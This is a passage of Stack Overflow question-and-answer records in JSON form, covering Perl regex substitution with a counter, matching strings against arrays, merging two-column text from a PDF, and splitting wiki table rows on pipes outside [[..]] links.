"https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": false, "score": 6, "last_activity_date": 1496298903, "last_edit_date": 1496298903, "creation_date": 1496297331, "answer_id": 44299711, "question_id": 44299650, "link": "https://stackoverflow.com/questions/44299650/how-to-have-incremented-variable-in-global-substitution/44299711#44299711", "title": "How to have incremented variable in global substitution?", "body": "<p>Use <a href=\"http://search.cpan.org/dist/perlsecret/lib/perlsecret.pod#Baby_cart\" rel=\"nofollow noreferrer\">baby cart</a> <code>@{[ ]}</code> from perlsecret</p>\n\n<pre><code>$html =~ s[&lt;p&gt;(.+?)&lt;/p&gt;][&lt;li value=\"@{[++$count]}\"&gt;$1&lt;/li&gt;]gis;\n</code></pre>\n\n<p>From <a href=\"https://perldoc.perl.org/perlref.html#Using-References\" rel=\"nofollow noreferrer\">perldoc</a></p>\n\n<blockquote>\n  <blockquote>\n    <p>The way it works is that when the @{...} is seen in the double-quoted string, it's evaluated as a block. The block creates a reference to an anonymous array containing the results of eval. </p>\n  </blockquote>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 2, "last_activity_date": 1496297555, "creation_date": 1496297555, "answer_id": 44299781, "question_id": 44299650, "link": "https://stackoverflow.com/questions/44299650/how-to-have-incremented-variable-in-global-substitution/44299781#44299781", "title": "How to have incremented variable in global substitution?", "body": "<p>You can use the <code>/e</code> modifier to turn the substitution part of the <code>s///</code> into a Perl expression that is evaluated once per substitution.</p>\n\n<pre><code>$html =~ s[&lt;p&gt;(.+?)&lt;/p&gt;]['&lt;li value=\"'.++$count.qq{\"&gt;$1&lt;/li&gt;}]gise;\n</code></pre>\n\n<p>Because it's a full expression, you need to put the rest of your string into quotes. I've used single and double quotes for the part without and with interpolation respectively. </p>\n\n<pre><code>my $html = \"&lt;p&gt;foo&lt;/p&gt;&lt;p&gt;bar&lt;/p&gt;\";\nmy $count = 0;\n$html =~ s[&lt;p&gt;(.+?)&lt;/p&gt;]['&lt;li value=\"'.++$count.qq{\"&gt;$1&lt;/li&gt;}]gise;\n\nprint $html;\n\n__END__\n&lt;li value=\"1\"&gt;foo&lt;/li&gt;&lt;li value=\"2\"&gt;bar&lt;/li&gt;\n</code></pre>\n"}], "owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1496298903, "creation_date": 1496297131, "question_id": 44299650, "link": "https://stackoverflow.com/questions/44299650/how-to-have-incremented-variable-in-global-substitution", "title": "How to have incremented variable in global substitution?", "body": "<pre><code>$html =~ s[&lt;p&gt;(.+?)&lt;/p&gt;][&lt;li value=\"++$count\"&gt;$1&lt;/li&gt;]gis;\n</code></pre>\n\n<p>How can I achieve the above code in perl?</p>\n\n<p>I need the <code>++$count</code> to be a number that increments for every substitution that takes place.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 7, "user_id": 5506017, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fc0f53e46f9a49f7a8a97269b466b9a5?s=128&d=identicon&r=PG&f=1", "display_name": "rohan", "link": "https://stackoverflow.com/users/5506017/rohan"}, "reply_to_user": {"reputation": 40086, "user_id": 499581, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1ba2cebc4582467916f2ddd6128447f4?s=128&d=identicon&r=PG", "display_name": "l&#39;L&#39;l", "link": "https://stackoverflow.com/users/499581/lll"}, "edited": false, "score": 0, "creation_date": 1496289960, "post_id": 44298304, "comment_id": 75602341, "body": "yes its pseudo code, and not the actual i am basically looking for the condition."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 3, "creation_date": 1496296388, "post_id": 44298304, "comment_id": 75604251, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/44259793/check-value-exists-in-perl-array-and-substring\">check value exists in perl array and substring</a>"}], "answers": [{"comments": [{"owner": {"reputation": 7, "user_id": 5506017, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fc0f53e46f9a49f7a8a97269b466b9a5?s=128&d=identicon&r=PG&f=1", "display_name": "rohan", "link": "https://stackoverflow.com/users/5506017/rohan"}, "edited": false, "score": 0, "creation_date": 1496651442, "post_id": 44327286, "comment_id": 75730803, "body": "your solution doesn&#39;t help,but thanks for the formatting."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 7, "user_id": 5506017, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fc0f53e46f9a49f7a8a97269b466b9a5?s=128&d=identicon&r=PG&f=1", "display_name": "rohan", "link": "https://stackoverflow.com/users/5506017/rohan"}, "edited": false, "score": 0, "creation_date": 1496665916, "post_id": 44327286, "comment_id": 75738920, "body": "@rohan: I&#39;m not surprised it doesn&#39;t help. No one can  fathom your question, and your code doesn&#39;t make much sense. I said as much as I could given what you wrote, and your reaction should be to fix your question and explain yourself better, not to give up and walk away. Your question has three down votes and two close votes, so it&#39;s not just me that thinks so."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1496402504, "last_edit_date": 1496402504, "creation_date": 1496401132, "answer_id": 44327286, "question_id": 44298304, "link": "https://stackoverflow.com/questions/44298304/compare-string-with-array-to-find-a-match/44327286#44327286", "title": "compare string with array to find a match", "body": "<p>You have written some awful Perl, and I am unsure of what you meant. Can you explain better?</p>\n\n<p>It looks like you want to parse a bespoke language, so simple grabs of substrings aren't going to work</p>\n\n<p>Is this homework, based on a machine that has been specified to you? Or are you working for a living doing this? If the latter then you have withheld information from us, so we can't help you very well.</p>\n\n<p>The obvious problem is that your C-style <code>for</code> loop would be better as a range, but you never use <code>$i</code> within the loop block</p>\n\n<p>Here's a version of your code that I tidied manually. I hope it helps someone else to help you</p>\n\n<pre><code>my @db_description = (\n    \"MOVE 1-2 STEPS TO GB FIXTURE\",\n    \"WITHIN REACH TO CHECK\",\n    \"GET BEAM\",\n    \"PUSH/PULL ( &gt;= 30 CM)\",\n    \"BEAM 2-3 TIMES\",\n    \"MOVE 8-10 STEPS TO HOIST\",\n);\n\nmy @steps_name = (\n    \"1-2 Steps\",\n    \"5-7 Steps\",\n    \"8-10 Steps\",\n    \"11-15 Steps\",\n);\n\nfor ( my $i = 0; $i &lt; @db_description; $i++ ) {\n\n    if ( grep { /(?i)\\Q$db_description[$i]\\E/ } @steps_name ) {\n        print \"&lt;br&gt;&lt;h1&gt;Element '$db_description' found !&lt;/h1&gt;&lt;/br&gt;\";\n    }\n    else {\n        print \"&lt;br&gt;$db_description not found &lt;/br&gt;\";\n    }\n}\n</code></pre>\n\n<p>An aside: please never use <code>(?i)</code> unless you especially need it. For instance, to build a regex pattern that will be used as a part of other patterns while the restriction should apply only for the subpattern.</p>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 8116695, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/738a6bfad1b065989778aa453e7432b6?s=128&d=identicon&r=PG&f=1", "display_name": "negi", "link": "https://stackoverflow.com/users/8116695/negi"}, "edited": false, "score": 0, "creation_date": 1496715960, "post_id": 44380429, "comment_id": 75761407, "body": "you can also use if exist in perl"}], "tags": [], "owner": {"reputation": 1, "user_id": 8116695, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/738a6bfad1b065989778aa453e7432b6?s=128&d=identicon&r=PG&f=1", "display_name": "negi", "link": "https://stackoverflow.com/users/8116695/negi"}, "is_accepted": false, "score": -1, "last_activity_date": 1496715820, "creation_date": 1496715820, "answer_id": 44380429, "question_id": 44298304, "link": "https://stackoverflow.com/questions/44298304/compare-string-with-array-to-find-a-match/44380429#44380429", "title": "compare string with array to find a match", "body": "<p>His question is valid.. Try following code</p>\n\n<pre><code>my @db_description=(\"MOVE 1-2 STEPS TO GB FIXTURE\",\"WITHIN REACH TO CHECK\",\"GET BEAM\",\"PUSH/PULL ( &gt;= 30 CM)\",\"BEAM 2-3 TIMES\",\"MOVE 8-10 STEPS TO HOIST\");\nmy @steps_name = (\"1-2 Steps\", \"5-7 Steps\", \"8-10 Steps\", \"11-15 Steps\");\nmy $testString1;\nmy $testString2;\n\nmy @abc;\nmy @xyz;\n\nfor(my $i=0;$i&lt;$#db_description;$i++)\n    {\n    @abc = split (/ /,$db_description[$i]);\n    for(my $j=0;$j&lt;$#steps_name;$j++)\n     {\n         @xyz = split (/ /, $steps_name[$j]);\n         for (my $i1=0; $i1&lt;$#abc; $i1++)\n            {\n            for (my $j1=0; $j1&lt;$#xyz; $j1++)\n            {\n                if ($abc[$i1] eq $xyz[$j1])\n                {\n                 print \"$db_description[$i]  :: found $abc[$i1] == $xyz[$j1]\\n\";\n                 }\n             }\n\n         }\n     }\n    }\n</code></pre>\n"}], "owner": {"reputation": 7, "user_id": 5506017, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fc0f53e46f9a49f7a8a97269b466b9a5?s=128&d=identicon&r=PG&f=1", "display_name": "rohan", "link": "https://stackoverflow.com/users/5506017/rohan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1496715820, "creation_date": 1496289498, "question_id": 44298304, "link": "https://stackoverflow.com/questions/44298304/compare-string-with-array-to-find-a-match", "title": "compare string with array to find a match", "body": "<p>can I compare individual string with complete array. In the below case i am not able to satisfy the condition may be due to improper regex due to case sensitive, I want to match any word.</p>\n\n<p>eg. MOVE 1-2 STEPS should match 1-2 Steps,MOVE 8-10 STEPS should match 8-10 Steps so on .</p>\n\n<pre><code>my @db_description=(\"MOVE 1-2 STEPS TO GB FIXTURE\",\"WITHIN REACH TO CHECK\",\"GET BEAM\",\"PUSH/PULL ( &gt;= 30 CM)\",\"BEAM 2-3 TIMES\",\"MOVE 8-10 STEPS TO HOIST\");\nmy @steps_name = (\"1-2 Steps\", \"5-7 Steps\", \"8-10 Steps\", \"11-15 Steps\");\n\n    for(my $i=0;$i&lt;@db_description;$i++)\n    {\n                if (grep { /(?i)\\Q$db_description[$i]\\E/ } @steps_name) \n                    {\n                         print \"&lt;br&gt;&lt;h1&gt;Element '$db_description' found !&lt;/h1&gt;&lt;/br&gt;\" ;\n                    }\n\n                    else\n                    {\n                         print \"&lt;br&gt;$db_description not found &lt;/br&gt;\"\n                    }\n    }\n</code></pre>\n"}, {"tags": ["r", "perl"], "comments": [{"owner": {"reputation": 26129, "user_id": 89482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e41743fa8aee7f5c7d1cd7ebfa77da85?s=128&d=identicon&r=PG", "display_name": "neilfws", "link": "https://stackoverflow.com/users/89482/neilfws"}, "edited": false, "score": 0, "creation_date": 1496288413, "post_id": 44297953, "comment_id": 75601972, "body": "I&#39;d be tempted to locate a non-PDF alternative. And if you want to use that specific story, there&#39;s a plain text version here: <a href=\"http://www.gutenberg.org/files/11/11-0.txt\" rel=\"nofollow noreferrer\">gutenberg.org/files/11/11-0.txt</a>. Failing that, look for another PDF to text conversion tool which will convert to 1-column output."}, {"owner": {"reputation": 80563, "user_id": 496803, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b8556bc403e46083a0cac69f902fa04f?s=128&d=identicon&r=PG", "display_name": "thelatemail", "link": "https://stackoverflow.com/users/496803/thelatemail"}, "edited": false, "score": 1, "creation_date": 1496289809, "post_id": 44297953, "comment_id": 75602310, "body": "Looks like a fixed width file - <code>dat &lt;- read.fwf(file, widths=c(37,48), stringsAsFactors=FALSE)</code> would give you a very good start if there is always a constant width in the two columns."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1496761054, "post_id": 44297953, "comment_id": 75786552, "body": "What <a href=\"https://www.nu42.com/2014/09/scraping-pdf-documents-without-losing.html\" rel=\"nofollow noreferrer\">saved my sanity</a> was realizing that <code>pdftohtml</code> has a very useful XML output mode."}], "answers": [{"tags": [], "owner": {"reputation": 80563, "user_id": 496803, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b8556bc403e46083a0cac69f902fa04f?s=128&d=identicon&r=PG", "display_name": "thelatemail", "link": "https://stackoverflow.com/users/496803/thelatemail"}, "is_accepted": false, "score": 0, "last_activity_date": 1496290617, "creation_date": 1496290617, "answer_id": 44298466, "question_id": 44297953, "link": "https://stackoverflow.com/questions/44297953/convert-two-columns-text-document-to-single-line-for-text-mining/44298466#44298466", "title": "convert two columns text document to single line for text mining", "body": "<p>Looks like a fixed width file if there is always a constant width in the two columns:</p>\n\n<pre><code>dat &lt;- read.fwf(textConnection(txt), widths=c(37,48), stringsAsFactors=FALSE)\ngsub(\"\\\\s+\", \" \", paste(unlist(dat), collapse=\" \"))\n</code></pre>\n\n<p>Which will put it all in one big long string:</p>\n\n<pre><code>[1] \"Alice was beginning to get very tired of sitting by her sister on the bank, and of having nothing to do: once or twice she had peeped into the book her sister was reading, but it had no pictures or conversations in it, `and what is the use of a book,' thought Alice `without pictures or conversation?\"\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496340109, "post_id": 44299935, "comment_id": 75634044, "body": "@pachamaltese  I edited a bit, for clarity, and added a couple of statements."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 0, "last_activity_date": 1496391689, "last_edit_date": 1496391689, "creation_date": 1496298197, "answer_id": 44299935, "question_id": 44297953, "link": "https://stackoverflow.com/questions/44297953/convert-two-columns-text-document-to-single-line-for-text-mining/44299935#44299935", "title": "convert two columns text document to single line for text mining", "body": "<p>With the fixed-width left column, we can split each line into the first 37 chars and the rest, adding these to strings for the left and right column. For instance, with regex</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = 'two_column.txt'\nopen my $fh, '&lt;', $file or die \"Can't open $file: $!\";\n\nmy ($left_col, $right_col);\n\nwhile (&lt;$fh&gt;) \n{\n    my ($left, $right) = /(.{37})(.*)/;\n\n    $left =~ s/\\s*$/ /;\n\n    $left_col  .= $left;\n    $right_col .= $right;\n}\nclose $fh;\n\nprint $left_col, $right_col, \"\\n\";\n</code></pre>\n\n<p>This prints the whole text. Or join columns, <code>my $text = $left_col . $right_col;</code></p>\n\n<p>The regex pattern <code>(.{37})</code> matches any character (<code>.</code>) and does this exactly 37 times (<code>{37}</code>), capturing that with <code>()</code>; the <code>(.*)</code> captures all remaining. These are returned by the regex, and assigned.  The trailing spaces in <code>$left</code> are condensed into one. Both are then appended (<code>.=</code>). </p>\n\n<p>Or from the command line</p>\n\n<pre><code>perl -wne'\n    ($l, $r) = /(.{37})(.*)/; $l =~ s/\\s*$/ /; $cL .= $l; $cR .= $r; \n     }{ print $cL,$cR,\"\\n\"\n' two_column.txt\n</code></pre>\n\n<p>where <code>}{</code> starts the <code>END</code> block, that runs before exit (after all lines have been processed).</p>\n"}], "owner": {"reputation": 2682, "user_id": 3720258, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/YSLDc.jpg?s=128&g=1", "display_name": "pachamaltese", "link": "https://stackoverflow.com/users/3720258/pachamaltese"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1404, "favorite_count": 2, "accepted_answer_id": 44299935, "answer_count": 2, "score": 2, "last_activity_date": 1538044853, "creation_date": 1496287274, "question_id": 44297953, "link": "https://stackoverflow.com/questions/44297953/convert-two-columns-text-document-to-single-line-for-text-mining", "title": "convert two columns text document to single line for text mining", "body": "<p>I've extracted text from pdf by using <code>pdftools</code> and saved the result as txt.</p>\n\n<p>Is there an efficient way to convert the txt with 2 columns to a file with one column.</p>\n\n<p>This is an example of what I have:</p>\n\n<pre><code>Alice was beginning to get very      into the book her sister was reading,\ntired of sitting by her sister       but it had no pictures or conversations\non the bank, and of having nothing   in it, `and what is the use of a book,' \nto do: once or twice she had peeped  thought Alice `without pictures or conversation?`\n</code></pre>\n\n<p>instead of </p>\n\n<pre><code>    Alice was beginning to get very tired of sitting by her sister on the bank, and \nof having nothing to do: once or twice she had peeped into the book her sister was \nreading, but it had no pictures or conversations in it, `and what is the use of a \nbook,' thought Alice `without pictures or conversation?'\n</code></pre>\n\n<p>Based on <a href=\"https://stackoverflow.com/questions/42541849/extract-text-from-two-column-pdf-with-r\">Extract Text from Two-Column PDF with R</a> I modified the function a bit to obtain:</p>\n\n<pre><code>library(readr)    \ntrim = function (x) gsub(\"(?&lt;=[\\\\s])\\\\s*|^\\\\s+|\\\\s+$\", \"\", x,  perl=TRUE)\n\nQTD_COLUMNS = 2\n\nread_text = function(text) {\n  result = ''\n  #Get all index of \" \" from page.\n  lstops = gregexpr(pattern =\" \",text)\n  #Puts the index of the most frequents ' ' in a vector.\n  stops = as.integer(names(sort(table(unlist(lstops)),decreasing=TRUE)[1:2]))\n  #Slice based in the specified number of colums (this can be improved)\n  for(i in seq(1, QTD_COLUMNS, by=1))\n  {\n    temp_result = sapply(text, function(x){\n      start = 1\n      stop =stops[i] \n      if(i &gt; 1)            \n        start = stops[i-1] + 1\n      if(i == QTD_COLUMNS)#last column, read until end.\n        stop = nchar(x)+1\n      substr(x, start=start, stop=stop)\n    }, USE.NAMES=FALSE)\n    temp_result = trim(temp_result)\n    result = append(result, temp_result)\n  }\n  result\n}\n\ntxt = read_lines(\"alice_in_wonderland.txt\")\n\nresult = ''\n\nfor (i in 1:length(txt)) { \n  page = txt[i]\n  t1 = unlist(strsplit(page, \"\\n\"))      \n  maxSize = max(nchar(t1))\n  t1 = paste0(t1,strrep(\" \", maxSize-nchar(t1)))\n  result = append(result,read_text(t1))\n}\n\nresult\n</code></pre>\n\n<p>But no luck with some of the files. I wonder if there's a more general/better regular expression to achieve the result.</p>\n\n<p>Many thanks in advance !</p>\n"}, {"tags": ["regex", "perl", "split", "delimiter", "quotes"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496281494, "post_id": 44296613, "comment_id": 75600324, "body": "So your problem is that, once you&#39;ve split the text on pipe characters, you can&#39;t parse the contents if they may contain a renamed link, a link, or no link. Is that right?"}, {"owner": {"reputation": 3439, "user_id": 522385, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7a34ec8fb0c5c9a2a455d63626bc9b1a?s=128&d=identicon&r=PG", "display_name": "Chap", "link": "https://stackoverflow.com/users/522385/chap"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496328736, "post_id": 44296613, "comment_id": 75627108, "body": "No, I can&#39;t split the text (the markup for an entire row of the table) into columns if they contain renamed links."}], "answers": [{"comments": [{"owner": {"reputation": 3439, "user_id": 522385, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7a34ec8fb0c5c9a2a455d63626bc9b1a?s=128&d=identicon&r=PG", "display_name": "Chap", "link": "https://stackoverflow.com/users/522385/chap"}, "edited": false, "score": 0, "creation_date": 1496364585, "post_id": 44298385, "comment_id": 75643796, "body": "As mentioned below, I couldn&#39;t find a Perl solution in CPAN or beyond."}, {"owner": {"reputation": 3439, "user_id": 522385, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7a34ec8fb0c5c9a2a455d63626bc9b1a?s=128&d=identicon&r=PG", "display_name": "Chap", "link": "https://stackoverflow.com/users/522385/chap"}, "edited": false, "score": 0, "creation_date": 1496442392, "post_id": 44298385, "comment_id": 75680353, "body": "This answer also handles cells without a link as well as cells with multiple links. Key takeaways for me are (1) use Regexp::Common, and (2) treat the both a single non-pipe character and a balanced expression as &quot;atomic&quot; alternatives that occur zero or more times. Simple."}], "tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": true, "score": 1, "last_activity_date": 1496673634, "last_edit_date": 1496673634, "creation_date": 1496290009, "answer_id": 44298385, "question_id": 44296613, "link": "https://stackoverflow.com/questions/44296613/regexp-that-splits-a-string-but-ignores-a-quoted-delimiter/44298385#44298385", "title": "regexp that splits a string but ignores a quoted delimiter", "body": "<pre><code>$ perl -MRegexp::Common -E '$_=shift; while (\n  /\\| # beginning pipe, and consume it\n  (   # capture 1\n    (?:  # inside the pipe we will do one of these:\n      $RE{balanced}{-begin=&gt;\"[[\"}{-end=&gt;\"]]\"} # something with balanced [[..]]\n      |[^|] # or a character that is not a pipe\n    )* # as many of those as necessary\n  ) # end capture one\n  (?=\\|) # needs to go to the next pipe, but do not consume it so g works\n  /xg\n) { say $1 }' '| Kiki fruit [[path:to:kiwi|Kiwi Fruit]]  |             Lemons|'\n Kiki fruit [[path:to:kiwi|Kiwi Fruit]]  \n             Lemons\n</code></pre>\n\n<p>This seems to extract the ones you're looking for.  However, I suspect you're better off with a proper parser for this language. I'd be surprised if there wasn't something on cpan, but even if not, writing a parser for this may still be better especially as you start to get more weird things in your tables that you need to handle.</p>\n"}], "owner": {"reputation": 3439, "user_id": 522385, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7a34ec8fb0c5c9a2a455d63626bc9b1a?s=128&d=identicon&r=PG", "display_name": "Chap", "link": "https://stackoverflow.com/users/522385/chap"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 44298385, "answer_count": 1, "score": 2, "last_activity_date": 1496867731, "creation_date": 1496276673, "question_id": 44296613, "link": "https://stackoverflow.com/questions/44296613/regexp-that-splits-a-string-but-ignores-a-quoted-delimiter", "title": "regexp that splits a string but ignores a quoted delimiter", "body": "<p>I'm writing a Perl program that needs to parse a table written in a Wiki markup language. The table syntax uses the pipe character '|' to separate the columns.</p>\n\n<pre><code>| row 1 cell 1    |row 1 cell 2  | row 1 cell 3|\n| row 2 cell 1    | row 2 cell 2 |row 2 cell 3|\n</code></pre>\n\n<p>A cell may contain zero or more hyperlinks, whose syntax is illustrated by:</p>\n\n<pre><code>[[wiki:path:to:page|Page Title]]   or\n[[wiki:path:to:page]]\n</code></pre>\n\n<p>Note that the hyperlink may contain the pipe character. Here, however, it is \"quoted\" by the [[..]] brackets.</p>\n\n<p>The hyperlink syntax may not be nested.</p>\n\n<p>In order to match and capture the first cell in each of these table rows,</p>\n\n<pre><code>| Potatoes [[path:to:potatoes]]           | Daisies           |\n| Kiki fruit [[path:to:kiwi|Kiwi Fruit]]  |             Lemons|\n</code></pre>\n\n<p>I tried:</p>\n\n<pre><code>qr{\\|                      # match literal pipe\n    (.*?                   # non-greedy zero or more chars\n        (?:\\[\\[.*?\\]\\])    # a hyperlink \n     .*?)                  # non-greedy zero or more chars\n   \\|}x                    # match terminating pipe\n</code></pre>\n\n<p>It worked, and $1 contained the cell contents.</p>\n\n<p>Then, to match</p>\n\n<pre><code>| Potatoes            | Daisies           |\n</code></pre>\n\n<p>I tried making the hyperlink optional:</p>\n\n<pre><code>qr{\\|                      # match literal pipe\n    (.*?                   # non-greedy zero or more chars\n        (?:\\[\\[.*?\\]\\])?   # &lt;-- OPTIONAL hyperlink \n     .*?)                  # non-greedy zero or more chars\n   \\|}x                    # match terminating pipe\n</code></pre>\n\n<p>This worked, but when parsing</p>\n\n<pre><code>| Kiki fruit [[path:to:kiwi|Kiwi Fruit]]  |             Lemons|\n</code></pre>\n\n<p>I only got</p>\n\n<pre><code> Kiki fruit [[path:to:kiwi\n</code></pre>\n\n<p>So evidently, given the option, it decided to disregard the hyperlink pattern and treat the embedded pipe as a column delimiter.</p>\n\n<p>Here I'm stuck. And I still haven't dealt with either the possibility of the hyperlink occurring more than once in a cell, or with giving back the trailing pipe to be the leading pipe on the next iteration.</p>\n\n<p>It isn't necessary that the regexp be used within Perl's <code>split</code> function -- I can write the splitting loop myself if it's easier. I see many similar questions being asked, but none seem to deal closely enough with this problem.</p>\n"}]